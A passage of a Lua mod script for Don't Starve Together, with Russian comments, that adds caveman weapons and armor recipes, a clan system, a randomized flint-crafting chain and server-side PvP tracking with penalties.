	RECIPETABS.LIGHT , TECH.NONE )
endothermic_torch.atlas = "images/inventoryimages/endothermic_torch.xml"

local seg_time = 30

TUNING.COLDTORCH_FUEL = seg_time*8


---Ребаланс оружия и брони
--Recipe("armorwood", {Ingredient("boards", 2),Ingredient("rope", 2)}, RECIPETABS.WAR,  TECH.NONE) --Опускаем деревянную броню на нулевой уровень.
ChangeRecipe("armorwood",{boards=2,rope=2},nil,TECH.NONE)



-----Первобытные предметы--------
AddPrefabs({
    "drok_club",
	"large_bone",
	"armor_beefalo",
	"armor_rock",
	"tomahavk",
	"sling",
	"slingshot",
	"wooden_club",
	"spear_throw",
	"armor_meat",
	"fightstick",
	"knife",
})

GLOBAL.STRINGS.NAMES.KNIFE = "Knife"
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.KNIFE = "This is a REALLY sharp knife."

AddAssets({
	Asset( "IMAGE", "images/caveman_tab.tex" ),
	Asset( "ATLAS", "images/caveman_tab.xml" ),
	Asset( "IMAGE", "images/ammo_slot.tex" ),
	Asset( "ATLAS", "images/ammo_slot.xml" ),

})

AddIngredientValues({"armor_meat"}, {meat=2,humanmeat=1})

----- Добавляю кастом таб

local resolvefilepath = GLOBAL.resolvefilepath
local TECH = GLOBAL.TECH
local CUSTOM_RECIPETABS = GLOBAL.CUSTOM_RECIPETABS
CUSTOM_RECIPETABS.CAVEMANTAB = { str = "CAVEMANTAB", sort=114, icon = "caveman_tab.tex", icon_atlas = resolvefilepath("images/caveman_tab.xml") }

----- Рецепты
local wooden_club_ing = GLOBAL.Ingredient( "wooden_club", 1)
	wooden_club_ing.atlas = "images/inventoryimages/wooden_club.xml"
local large_bone_ing_1 = GLOBAL.Ingredient( "large_bone", 1)
	large_bone_ing_1.atlas = "images/inventoryimages/large_bone.xml"
--local large_bone_ing_2 = GLOBAL.Ingredient( "large_bone", 2) --переехали наверх (к костяному сундуку)
--	large_bone_ing_2.atlas = "images/inventoryimages/large_bone.xml"
local tech_zero = {SCIENCE = 0, MAGIC = 0, ANCIENT = 0}


--local knife = Recipe("knife", {Ingredient("flint", 6)}, CUSTOM_RECIPETABS.CAVEMANTAB, TECH.LOST)
--knife.atlas = resolvefilepath("images/inventoryimages/knife.xml")	

--blunt
local wooden_clubcraft = Recipe("wooden_club", {Ingredient("log", 6)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
wooden_clubcraft.atlas = resolvefilepath("images/inventoryimages/wooden_club.xml")	
STRINGS.NAMES.WOODEN_CLUB = "Wooden Club"
GLOBAL.STRINGS.RECIPE_DESC.WOODEN_CLUB = "Simple caveman club made of logs."
STRINGS.CHARACTERS.GENERIC.DESCRIBE.WOODEN_CLUB = "It's some kind of ancient smashing device."
		
local drok_clubcraft = Recipe("drok_club", {wooden_club_ing, Ingredient("houndstooth",3)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
drok_clubcraft.atlas = resolvefilepath("images/inventoryimages/drok_club.xml")	
STRINGS.NAMES.DROK_CLUB = "Toothy Cudgel"
GLOBAL.STRINGS.RECIPE_DESC.DROK_CLUB = "DROK SMASH!!!!"
STRINGS.CHARACTERS.GENERIC.DESCRIBE.DROK_CLUB = "It's some kind of ancient smashing device."	
		
local spear_throwcraft = Recipe("spear_throw", {Ingredient("spear1", 1), large_bone_ing_1, Ingredient("rope", 1)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
spear_throwcraft.atlas = resolvefilepath("images/inventoryimages/spear_throw.xml")	
STRINGS.NAMES.SPEAR_THROW = "Throwing Spear"
GLOBAL.STRINGS.RECIPE_DESC.SPEAR_THROW = "Somehow related to javelin?"
		
local tomahavkcraft = Recipe("tomahavk", {Ingredient("f6", 1), Ingredient("twigs", 1), Ingredient("slurtleslime", 1)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
tomahavkcraft.atlas = resolvefilepath("images/inventoryimages/tomahavk.xml")	
STRINGS.NAMES.TOMAHAVK = "Tomahawk"
GLOBAL.STRINGS.RECIPE_DESC.TOMAHAVK = "Throwing axe."
		
local slingcraft = Recipe("sling", {Ingredient("rope", 3)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
slingcraft.atlas = resolvefilepath("images/inventoryimages/sling.xml")	
STRINGS.NAMES.SLING = "Sling"
GLOBAL.STRINGS.RECIPE_DESC.SLING = "Even better than club."
		
local slingshotcraft = Recipe("slingshot", {Ingredient("rocks", 1), Ingredient("flint", 1)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
slingshotcraft.atlas = resolvefilepath("images/inventoryimages/slingshot.xml")	
STRINGS.NAMES.SLINGSHOT = "Slingshot"
GLOBAL.STRINGS.RECIPE_DESC.SLINGSHOT = "Use with sling and proper care."
		
local armor_beefalocraft = Recipe("armor_beefalo", {Ingredient("beefalowool", 10), Ingredient("silk", 6), Ingredient("rope", 2)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
armor_beefalocraft.atlas = resolvefilepath("images/inventoryimages/armor_beefalo.xml")	
STRINGS.NAMES.ARMOR_BEEFALO = "Beefalo Vest"
GLOBAL.STRINGS.RECIPE_DESC.ARMOR_BEEFALO = "Beefalo suit. Warm and tough."
		
local armor_rockcraft = Recipe("armor_rock", {Ingredient("rocks", 10), Ingredient("flint", 6), Ingredient("phlegm", 2)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
armor_rockcraft.atlas = resolvefilepath("images/inventoryimages/armor_rock.xml")	
STRINGS.NAMES.ARMOR_ROCK = "Rock Armor"
GLOBAL.STRINGS.RECIPE_DESC.ARMOR_ROCK = "Seems too heavy to wear it."

local armor_meatcraft = Recipe("armor_meat", {Ingredient("meat", 5), Ingredient("rope", 2)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
armor_meatcraft.atlas = resolvefilepath("images/inventoryimages/armor_meat.xml")	
STRINGS.NAMES.ARMOR_MEAT = "Meat Armor"
GLOBAL.STRINGS.RECIPE_DESC.ARMOR_MEAT = "Hard and fleshy."

--[[local weapon_fightstick = Recipe("fightstick", {Ingredient("twigs", 5)}, CUSTOM_RECIPETABS.CAVEMANTAB, tech_zero)
weapon_fightstick.atlas = resolvefilepath("images/inventoryimages/fightstick.xml")	
STRINGS.NAMES.FIGHTSTICK = "Fight Stick"
GLOBAL.STRINGS.RECIPE_DESC.FIGHTSTICK = "My first weapon!"--]]

STRINGS.NAMES.LARGE_BONE = "Large Bone"
STRINGS.CHARACTERS.GENERIC.DESCRIBE.LARGE_BONE = "Large beefalo bone."


---Пещерная оптимизация
AddPrefabs({
	"slurper",
	"slurtle",
	"cavespiders",
	"worm",
	"wormlight",
	"monkey",
	"monkeybarrel",
	"monkeyprojectile",
	"rocky",
	"dropperweb",
	"slurtlehole",
	"cave_banana_tree",
	"lanternfire",
	
	--"cavelight",
})
GLOBAL.GetNightmareClock = function () return nil end --фикс на старую пещерную механику


--Относится к обработке кланов - невидимость значка в случае кольца или амулета
local function OnInvisible(inst, data)
	local t = data.color
	if t and inst.clanicon and inst.clanicon.AnimState then
		inst.clanicon.AnimState:SetMultColour(t,t,t,t)
	end
end

--Обработка кланов
local function OnClanChanged(inst, data) --server side handler
	--print("Reciened Event! = "..data.clan)
	local anim = (data.clan and data.clan>0) and ("clan"..data.clan) or (data.clan==0 and "noclan" or nil)
	if anim then
		if not(inst.clanicon and inst.clanicon:IsValid()) then
			inst.clanicon = _G.SpawnPrefab("clanicon")
			if (inst.clanicon and inst.clanicon:IsValid()) then
				--inst.clanicon.entity:SetParent(inst.entity)
				inst:AddChild(inst.clanicon)
			else
				inst.clanicon = nil
			end
		end
		if inst.clanicon then
			inst.clanicon.AnimState:PlayAnimation(anim)
		end
	else --Иначе удаляем иконку полностью.
		if inst.clanicon then
			if inst.clanicon:IsValid() then
				inst:RemoveChild(inst.clanicon)
				inst.clanicon:Remove()
			end
			inst.clanicon = nil
		end
	end
	inst.net_client_clan_id:set(data.clan) --Это номер клана, либо 0 (если штраф), либо -1 (если нет клана).
end
local function u_pack(x,z)
	return (math.floor(z + 8192) * 16384 + math.floor(x + 8192))
end
local function u_unpack(n)
	return (n%16384)-8192, math.floor(n/16384)-8192
end

local function OnCoordsChanged(inst) --client side function
	--print("OnCoordsChanged: inst = "..tostring(inst)..", ThePlayer = "..tostring(ThePlayer))
	if not (inst==_G.ThePlayer) then
		return
	end
	--print("PASSED! "..tostring(inst))
	inst.clan_coords = inst.net_clan_coords:value()
	local x,z = u_unpack(inst.clan_coords)
	if x==8000 then --removing icon
		if w.clan_trace then
			w.clan_trace.MiniMapEntity:SetEnabled(false)
		end
	else
		if not w.clan_trace then
			w.clan_trace = SpawnPrefab('globalicon')
		end
		if w.clan_trace then
			w.clan_trace.MiniMapEntity:SetEnabled(true)
			w.clan_trace.Transform:SetPosition(x,0,z)
		end
	end
end
local function OnSendClanDirty(inst,force) --client
	--print("On Send Clan Dirty")
	inst.client_clan_id = force or inst.net_client_clan_id:value()
	--Действия?
	--... Ничего не делаем. Это нужно для проверки союзников не клиенте.
	--А вообще-то надо обновить рецепты. Здесь мы получаем всё, что касается кланов. А именно - уровень.
	if inst.client_clan_id >= 0 then
		inst.craft_featherhat = false
	else
		inst.craft_featherhat = true
	end
	if inst.client_clan_id < 3 then --clan 3 level
		inst.craft_piece = false
	else
		inst.craft_piece = true
	end
end
local AddBuildCondition = mods.TopMod.AddBuildCondition
if CLIENT_SIDE then --добавляем рецепты кланового крафта
	AddBuildCondition("featherhat","craft_featherhat")
	AddBuildCondition("nightmare_timepiece","craft_piece")
end
AddPlayersPostInit(function(inst)
	--print("Player Post Init")
	inst.client_clan_id = -1
	inst.net_client_clan_id = _G.net_ushortint(inst.GUID, "client_clan_id", "sendclan_dirty")
	inst.clan_coords = -1 --отсутствуют
	inst.net_clan_coords = _G.net_uint(inst.GUID, "clan_coords", "sendclan_coords")
	--print("CLIENT_SIDE = "..tostring(CLIENT_SIDE))
	if CLIENT_SIDE then
		inst.craft_featherhat = true --иначе до этого никогда не дойдет у новичка.
		inst:ListenForEvent("sendclan_dirty", OnSendClanDirty)
		OnSendClanDirty(inst,-1)
		inst:ListenForEvent("sendclan_coords",OnCoordsChanged)
	end
    if ONLY_CLIENT_SIDE then
        return
    end	
	inst:ListenForEvent("clanchanged", OnClanChanged)
	inst:ListenForEvent("oninvisible", OnInvisible)
	inst:ListenForEvent("new_clan_coords",function(inst,data)
		inst.net_clan_coords:set(u_pack(data.x,data.z))
	end)
end)


------------ Update Local Recipe System ----------
--print("CLIENT_SIDE = "..tostring(CLIENT_SIDE))
if CLIENT_SIDE then
	--print("CLIENT_SIDE = "..tostring(CLIENT_SIDE))
	--print("UPDATE LOCAL RECIPE")
	local function GetEquippedItem(self, eslot)
		return self._equipspreview ~= nil and self._equipspreview[eslot] or
			(self._equips[eslot] ~= nil and self._equips[eslot]:value() or nil)
	end
	local back = _G.EQUIPSLOTS.BACK or _G.EQUIPSLOTS.BODY --compatible with "Extra Equip Slots" mod
	local function GetOverflowContainer(self)
		local item = GetEquippedItem(self, back)
		return item ~= nil and item.replica.container or nil
	end
	local function Count(item)
		return item.replica.stackable ~= nil and item.replica.stackable:StackSize() or 1
	end
	
	--local inv_rep = require "components/inventory_replica"
	local function MyUpdateInventory(inst,result_table)
		local new_inventory = result_table or {nil,nil,nil,nil,nil,nil,nil,nil,nil,nil}
		if inst._activeitem ~= nil then
			new_inventory[inst._activeitem.prefab] = Count(inst._activeitem) or 0
		end
		if inst._itemspreview ~= nil then
			for i, v in ipairs(inst._items) do
				local item = inst._itemspreview[i]
				if item ~= nil and item.prefab then
					if not new_inventory[item.prefab] then
						new_inventory[item.prefab] = 0
					end
					new_inventory[item.prefab] = new_inventory[item.prefab] + Count(item)
				end
			end
		else
			for i, v in ipairs(inst._items) do
				local item = v:value()
				if item ~= nil and item ~= inst._activeitem and item.prefab then
					if not new_inventory[item.prefab] then
						new_inventory[item.prefab] = 0
					end
					new_inventory[item.prefab] = new_inventory[item.prefab] + Count(item)
				end
			end
		end
	
		local overflow = GetOverflowContainer(inst)
		if overflow ~= nil and overflow.classified then
			--_G.arr(overflow,3)
			overflow.classified:MyUpdateInventoryContainer(new_inventory) --пробегаемся по рюкзаку
		end

		if not result_table then
			return new_inventory
		end
	end
	AddPrefabPostInit("inventory_classified",function(inst)
		inst.MyUpdateInventory = MyUpdateInventory
	end)
	
	local function MyUpdateInventoryContainer(inst, result_table)
		local count = 0
		if inst._itemspreview ~= nil then
			for i, v in ipairs(inst._items) do
				local item = inst._itemspreview[i]
				if item ~= nil and item.prefab then
					if not result_table[item.prefab] then
						result_table[item.prefab] = 0
					end
					result_table[item.prefab] = result_table[item.prefab] + Count(item)
				end
			end
		else
			for i, v in ipairs(inst._items) do
				local item = v:value()
				if item ~= nil and item.prefab then
					if not result_table[item.prefab] then
						result_table[item.prefab] = 0
					end
					result_table[item.prefab] = result_table[item.prefab] + Count(item)
				end
			end
		end
		return result_table
	end
	AddPrefabPostInit("container_classified",function(inst)
		inst.MyUpdateInventoryContainer = MyUpdateInventoryContainer
	end)
	
	local save_local --local inventory
	local function UpdateRecipes(inst)
		--Условия для крафта золота
		inst.craft_gold = save_local.goldnugget and save_local.goldnugget > 3
		--Условия для крафта кремня
		inst.two_flints = save_local.flint --and save_local.flint > 0
		inst.is_f1 = save_local.f1
		inst.is_f2 = save_local.f2
		inst.is_f3 = save_local.f3
		inst.is_f4 = save_local.f4
		inst.is_f5 = save_local.f5
		inst.is_f6 = save_local.f6
		inst.is_f7 = save_local.f7
		inst.is_f8 = save_local.f8
		inst.is_f9 = save_local.f9
		inst.is_f10 = save_local.f10
		inst.is_f11 = save_local.f11
		inst.is_f12 = save_local.f12
		inst.is_f13 = save_local.f13
		inst.is_f14 = save_local.f14
		inst.is_f15 = save_local.f15
		inst.is_f16 = save_local.f16
		inst.is_f17 = save_local.f17
		inst.is_f18 = save_local.f18
	end
	local OnTickFn = function(inst)
		if not inst:IsValid() then
			inst.recipes_task:Cancel()
			return
		end
		if inst.replica.inventory and inst.replica.inventory.classified then --на других персонажей и не будет работать, т.к. у них нет инвентаря
			save_local = inst.replica.inventory.classified:MyUpdateInventory()
			UpdateRecipes(inst)
		end
	end
	AddPlayersPostInit(function(inst)
		--print("THEPLAYER == "..tostring(_G.ThePlayer))
		local init_timer
		init_timer = inst:DoPeriodicTask(0.3,function(inst)
			if not _G.ThePlayer then
				return --ждем до тех пор, пока ThePlayer не будет должны образом проинициализирован (мы в CLIENT_SIDE)
			end
			init_timer:Cancel()
			if inst==_G.ThePlayer then
				inst.recipes_task = inst:DoPeriodicTask(0.5+math.random()*0.1,OnTickFn)
			end
		end)
	end)
	AddBuildCondition("gold","craft_gold")

end



------------------- My Buffs System --------------------
do
	local function OnUpdateBuffs(inst,buffname) --Срабатывает при изменении бафов
	end

	--_G.arr(mods)
	local AddBuff = mods.TopMod.AddBuff --здесь будет краш, если нужный мод отсутствует
	AddPlayersPostInit(function(inst)
		AddBuff(inst,"poison",OnUpdateBuffs)
		AddBuff(inst,"bleeding",OnUpdateBuffs)
	end)
end


--Фикс на систему рецептов. (Временно!)
local comp_tilebg = require "widgets/tilebg"
local old_SetNumTiles = comp_tilebg.SetNumTiles
function comp_tilebg:SetNumTiles(numtiles,...)
	if numtiles == 0 then
		return
	end
	return old_SetNumTiles(self,numtiles,...)
end

--Свет свыше
--[[
local function OnTriggerDirty(inst)
	inst.trigger_light = inst.net_trigger_light:value()
	if inst.trigger_light then --нужно показать вспышку света
		local light = SpawnPrefab("cavelight")
		if light then
			light.Transform:SetPosition(inst.Transform:GetWorldPosition())
			light:DoTaskInTime(2,light.Remove)
		end
	end
end
AddPlayersPostInit(function(inst)
	inst.trigger_light = false
	inst.net_trigger_light = _G.net_bool(inst.GUID, "trigger_light", "trigger_light_dirty")
	if not _G.TheWorld.ismastersim then
		inst:ListenForEvent("trigger_light_dirty", OnTriggerDirty)
	else
		inst.SetLightTrigger = function()
			inst.trigger_light = true
			inst.net_trigger_light:set(true)
			inst:DoTaskInTime(0,function(inst)
				inst.trigger_light = false
				inst.net_trigger_light:set(false)
			end)
		end
	end
end)--]]


--Крафт новых инструментов
do
	local atlas = "images/images1.xml"
	--Начинаем с самого крутого и полезного
	AddRecipe("axe5",{Ingredient("f17",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,atlas)
	AddRecipe("spear4",{Ingredient("f14",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,atlas)
	AddRecipe("axe4",{Ingredient("f16",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,atlas)
	AddRecipe("spear3",{Ingredient("f10",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,atlas)
	AddRecipe("shovel2",{Ingredient("f12",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_ONE,nil,nil,nil,nil,nil,atlas,"shovel3.tex")
	AddRecipe("axe3",{Ingredient("f11",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_ONE,nil,nil,nil,nil,nil,atlas)
	AddRecipe("spear2",{Ingredient("f5",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_ONE,nil,nil,nil,nil,nil,atlas)
	AddRecipe("axe2",{Ingredient("f6",1),ing_staff0},RECIPETABS.TOOLS,TECH.SCIENCE_ONE,nil,nil,nil,nil,nil,atlas)
	AddRecipe("axe1",{Ingredient("f3",1),ing_staff0},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil,nil,nil,atlas)
	AddRecipe("spear1",{Ingredient("f3",1),ing_staff0},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil,nil,nil,nil,"spear.tex")
	AddRecipe("shovel1",{Ingredient("f6",1),ing_staff0},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil,nil,nil,atlas,"shovel2.tex")--]]
	AddRecipe("pickaxe1",{Ingredient("f13",2),ing_staff0},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil,nil,nil,nil,"pickaxe.tex")
	local RemoveRecipe = mods.TopMod.RemoveRecipe
	RemoveRecipe("axe")
	RemoveRecipe("pickaxe")
	RemoveRecipe("razor")
	RemoveRecipe("shovel")
	RemoveRecipe("spear")
	RemoveRecipe("pitchfork")
	if CLIENT_SIDE then
		local AddBuildCondition = mods.TopMod.AddBuildCondition
		--AddBuildCondition("axe1","is_f3")
		AddBuildCondition("axe2","is_f6")
		AddBuildCondition("axe3","is_f11")
		AddBuildCondition("axe4","is_f16")
		AddBuildCondition("axe5","is_f17")
		AddBuildCondition("spear1","is_f3")
		AddBuildCondition("spear2","is_f5")
		AddBuildCondition("spear3","is_f10")
		AddBuildCondition("spear4","is_f14")
		AddBuildCondition("shovel1","is_f6")
		AddBuildCondition("shovel2","is_f12")
		--AddBuildCondition("pickaxe1","is_f13")
	end
end

--Новые виды кремня
AddPrefabs({"flints"})
AddAssets({
	Asset( "IMAGE", "images/images1.tex" ),
	Asset( "ATLAS", "images/images1.xml" ),	
})

--Сложная система крафта кремней разного качества.
--print('Flint System')
local function AddFlintRecipe(name,from1,from2)
	from1=from1 or "flint"
	from2=from2 or "flint"
	if from1=='f1' then
		--print('F1 Ingredient!')
		--print(tostring(Ingredient))
	end
	return AddRecipe(name,{Ingredient(from1,1),Ingredient(from2,1)},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil, -- Nounlock? I really don't know.
	nil,nil,"images/images1.xml"
	--name..".tex" -- Image texture file.
	)
end
AddRecipe("f1",{Ingredient("flint",2)},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil, -- Nounlock? I really don't know.
	nil,nil,"images/images1.xml") --Главный ингредиент не экранируем, чтобы интриговать.
--print('Adding recipes...')
--AddFlintRecipe("f1")
local spec_rec = AddFlintRecipe("f30","f2")
spec_rec.image = "f3.tex"
AddFlintRecipe("f3","f1")
AddFlintRecipe("f5","f3")
AddFlintRecipe("f10","f5")
AddFlintRecipe("f11","f6")
AddFlintRecipe("f13","f4") --половинка лезвия
spec_rec = AddFlintRecipe("f40","f7")
spec_rec.image = "f13.tex"
spec_rec = AddFlintRecipe("f53","f3")
spec_rec.image = "f13.tex"
spec_rec.numtogive = 2
AddFlintRecipe("f14","f10")
AddFlintRecipe("f16","f11")
AddFlintRecipe("f17","f16")
AddFlintRecipe("f19","f8") --осколок
spec_rec = AddFlintRecipe("f50","f9")
spec_rec.image = "f19.tex"
spec_rec = AddFlintRecipe("f51","f15")
spec_rec.image = "f19.tex"
spec_rec = AddFlintRecipe("f52","f18")
spec_rec.image = "f13.tex"
if CLIENT_SIDE then --убираем ненужные рецепты
	AddBuildCondition("f1","two_flints")
	AddBuildCondition("f30","is_f2") --Ха-ха. На самом деле это переопределение на f3, просто второй способ крафта.
	AddBuildCondition("f3","is_f1")
	AddBuildCondition("f5","is_f3")
	AddBuildCondition("f10","is_f5")
	AddBuildCondition("f11","is_f6")
	AddBuildCondition("f13","is_f4") AddBuildCondition("f40","is_f7") AddBuildCondition("f53","is_f3")
	AddBuildCondition("f14","is_f10")
	AddBuildCondition("f16","is_f11")
	AddBuildCondition("f17","is_f16")
	AddBuildCondition("f19","is_f8") AddBuildCondition("f50","is_f9") AddBuildCondition("f51","is_f15") AddBuildCondition("f52","is_f18")
end
--[[AddRecipe("f1",{Ingredient("flint",2)},RECIPETABS.TOOLS,TECH.NONE,nil,nil,true, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, --"can_craft_piece", -- Builder tag to make it character specific.
"images/images1.xml", -- Image atlas file. 
"f1.tex" -- Image texture file.
)--]]
if SERVER_SIDE then
	local fns = mods.TopMod.ChangeProductFns
	fns.f1 = function(recipe,ing) --крафт "0" из обычного кремня
		--print('Preview = '..recipe.product)
		if math.random() < 0.5 then
			--print('Crafting random F2')
			recipe.product = "f2" --0 or 0'
		end
		--print('Result = '..recipe.product)
	end
	--Крафт 1 лвл
	fns.f3 = function(recipe,ing) --крафт "1" из f1 (0)
		if math.random() < 0.5 then
			recipe.product = "f2" --снова шанс уйти в 0'
		end
	end
	fns.f30 = function(recipe,ing) --крафт "1" из f2 (0') --Это небольшой хак, потому что имена рецептов уникальны.
	--Подменяем всё - продукт и текстуру.
		if math.random() < 0.5 then
			recipe.product = "f3"
		else
			recipe.product = "f19" --шлак
		end
	end
	--Крафт 2 лвл
	fns.f5 = function(recipe,ing) --крафт 2к из f3 (1)
		local r = math.random()
		if r < 0.33 then
			recipe.product = "f4" --1'
		elseif r < 0.66 then
			recipe.product = "f6" --2tl
		end
	end
	--Крафт 3 лвл - 2 направления: копье и топор
	fns.f10 = function(recipe,ing) --крафт 3к из f5 (2к)
		local r = math.random()
		if r < 0.25 then
			recipe.product = "f7" --3к'1
		elseif r < 0.50 then
			recipe.product = "f8" --3k'2
		elseif r < 0.75 then
			recipe.product = "f9" --3k'3
		end
	end
	fns.f11 = function(recipe,ing) --крафт 3t из f6 (2tl)
		if math.random() < 0.5 then
			recipe.product = "f12" --3L
		end
	end
	--Крафт 4 лвл - также 2 направления
	fns.f14 = function(recipe,ing) --крафт 4к из f10 (3к)
		if math.random() < 0.5 then
			recipe.product = "f13" --4к'
		end
	end
	fns.f16 = function(recipe,ing) --крафт 4t из f11 (3t)
		if math.random() < 0.5 then
			recipe.product = "f15" --4t'
		end
	end
	--Крафт 5 лвл. 33%!
	fns.f17 = function(recipe,ing) --крафт 5t из f16 (4е)
		if math.random() < 0.66 then
			recipe.product = "f18" --5t' --надо приспособить для какого-нть бумеранга
		end
	end
	--Хак на половинку острия
	fns.f40 = function(recipe,ing)
		recipe.product = "f13"
	end
	--Хаки на осколки
	fns.f50 = function(recipe,ing)
		recipe.product = "f19"
	end
	fns.f51 = function(recipe,ing)
		recipe.product = "f19"
	end
	fns.f52 = function(recipe,ing)
		recipe.product = "f13"
	end
	fns.f53 = function(recipe,ing)
		recipe.product = "f13"
	end
	
end

--Добавляем рецепт древка (посоха)
AddRecipe("staff0",{Ingredient("twigs",3)},RECIPETABS.TOOLS,TECH.NONE,nil,nil,nil, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, --"can_craft_piece", -- Builder tag to make it character specific.
"images/images2.xml", -- Image atlas file. 
"staff0.tex" -- Image texture file.
)


--Запрет на атаку союзников из клана.
do
	local comb_rep = _G.require "components/combat_replica"
	local old_IsAlly = comb_rep.IsAlly
	function comb_rep:IsAlly(guy,...)
		if guy.client_clan_id and guy.client_clan_id > 0 and guy.client_clan_id == self.inst.client_clan_id then
			return true --Соклан.
		end
		return old_IsAlly(self,guy,...)
	end
end


-----Штрафы в режиме пвп

PENALTY_VALUE = 0.1 --процент здоровья, который отнимается за 1 раз

_G.STRINGS.NAMES.PVPSYSTEM="PvP Rules"
if SERVER_SIDE then
	--local c_announce = _G.c_announce
	local GetTime = _G.GetTime
	local _pvp_players = {} --private array if players in pvp mode

	local function RegisterPvpPlayer(inst)
		_pvp_players[inst.userid] = {tm = GetTime(), name = inst.name, is_peace_zone = (inst.lamp_protect and inst.lamp_protect > 0)}
	end

	local function UnregisterPvpPlayer(inst)
		_pvp_players[inst.userid] = nil
	end
	
	local function linedist(x1,y1,x2,y2,dist)
		return math.max(math.abs(x1-x2),math.abs(y1-y2))
	end

	AddPrefabPostInit("forest",function(inst)
		inst:DoPeriodicTask(0.5,function(inst)
			local coords = {} --координаты всех игроков (понадобятся ниже)
			--смотрим на часы
			local time_now = GetTime()
			--смотрим текущий онлайн
			local current_online = {}
			local pvp_players = {} --указатели непосредственно на игроков (чтобы ниже не перебирать весь AllPlayers)
			for i,v in ipairs(AllPlayers) do
				--Здесь скромно проверяем, перешел ли игрок в воду. И если да, то нагло телепортируем его к ближайшему выходу.
				--Anticheat:
				local tile = v:GetCurrentTileType()
				if (tile == 1 or tile == 255) then --and v.userid ~= "KU_7jBnfOI2" then
					if not v.prepare_to_teleport then
						v.prepare_to_teleport = 1
					else
						v.prepare_to_teleport = v.prepare_to_teleport + 1
					end
					if v.prepare_to_teleport >= 4 then --только если набрали достаточное количество раз, то телепоритруемся
						if v.userid ~= "KU_7jBnfOI2" then --ну, кроме меня, конечно же.
							v.components.clanmember:TeleportToNearestExit()
						end
					end
				else
					v.prepare_to_teleport = 0 --иначе сбрасываем тп готовность для читеров
				end
				--Идем дальше..
				current_online[v.userid]=true
				--собираем координаты и проверяем доп. условия в пушинге пвп
				if v.knownTargets --есть запоминалка дружественных целей
					and not(v.endiaamulet_active or v:HasTag("badring")) --и НЕ невидим
				then
					local x,y,z = v.Transform:GetWorldPosition()
					table.insert(coords,{x,z})
					table.insert(pvp_players,v)
				end
			end
			--ищем тех, кто в пвп, но почему-то оффлайн, хотя сервер еще работает
			for k,v in pairs(_pvp_players) do
				if current_online[k] then
					--просто обновляем время, когда его последний раз видели
					v.tm = time_now --tm last seen
					--Удаление из списка происходит в другом месте тупо по таймеру.
				elseif v.is_peace_zone then
					_pvp_players[k] = nil --Если вышел в пис зоне, то просто забываем о нем.
				else
					--нашли прогульщика!
					if (time_now - v.tm < 0.85) then
						--print("Found coward!!! "..v.name)
						--c_announce((v.name=="" and "???" or v.name) .. " is the coward!")
					end
					local j = w.components.justsave
					if (time_now - v.tm > 90) and j and #AllPlayers > 0 then --время истекло! пора штрафовать!
						--условие на #AllPlayers - это защита от массового дисконнекта, чтобы зря не получали штрафы
						--print("Sending penalty to "..v.name.."...")
						_pvp_players[k] = nil --вычеркиваем из списка активных пвпшеров
						--Мы не может наложить штраф немедленно, поэтому отправляем квитанцию через почту
						local data = j.data.pvp_penalty[k]
						if not data then
							data = {revives=0,tm=-9000}
							j.data.pvp_penalty[k] = data
						end
						--data.revives = data.revives + 1 --Когда он зайдет, ему будет начислен штраф.
						data.tm = time_now --Время чисто символически показываем.
						--c_announce((v.name=="" and "???" or v.name) .. " is the coward and will be punished next time.")
					end
				end
			end
			--Обрабатываем все дружественные цели (макс 250 проверок в 0.5 сек)
			local cnt = #pvp_players
			if cnt>1 then
				for i=1,cnt-1 do local v = pvp_players[i]
					for j=i+1,cnt do local v2 = pvp_players[j]
						--local bad2 = (v2.aggro + v2.kills >= 20)
						local dist = linedist(coords[i][1],coords[i][2],coords[j][1],coords[j][2])
						local v_data, v2_data
						if dist < 11 --and v.knownTargets and v2.knownTargets --доп. проверки учтены выше при формировании pvp_players
						then --инициализация (знакомство)
							--print("dist < 40!")
							if not v.knownTargets[v2.userid] then
								v_data = v.knownTargets.new()
								v.knownTargets[v2.userid] = v_data
							else
								v_data = v.knownTargets[v2.userid]
							end
							if not v2.knownTargets[v.userid] then
								v2_data = v2.knownTargets.new()
								v2.knownTargets[v.userid] = v2_data
							else
								v2_data = v2.knownTargets[v.userid]
							end
							--проверяем возможность пвп. Сначала условия для обоих.
							--print(v_data.respect..", "..v.kills..", "..v2.kills)
							if (v_data.respect < 420) --дружба менее 7 мин
								and (v.clan_id == -1 or v.clan_id ~= v2.clan_id) --не сокланы
							then
								--Первый
								if v.kills >=3 or (v.aggro + v.kills >= 20) --абсолютные условия
									or v.kills >= v2.kills+5 --относительное условие
								then
									v:PushEvent("pvp_mode",{reason="dist"})
								end
								--Второй
								if v2.kills >=3 or (v2.aggro + v2.kills >= 20) --абсолютные условия
									or v2.kills >= v.kills+5 --относительное условие
								then
									v2:PushEvent("pvp_mode",{reason="dist"})
								end
							end
							if dist < 10 then --увеличиваем дружбу
								v_data.respect = v_data.respect + 0.5
								v2_data.respect = v2_data.respect + 0.5
							end
						end
					end
				end
			end
		end)
	end)
	
	
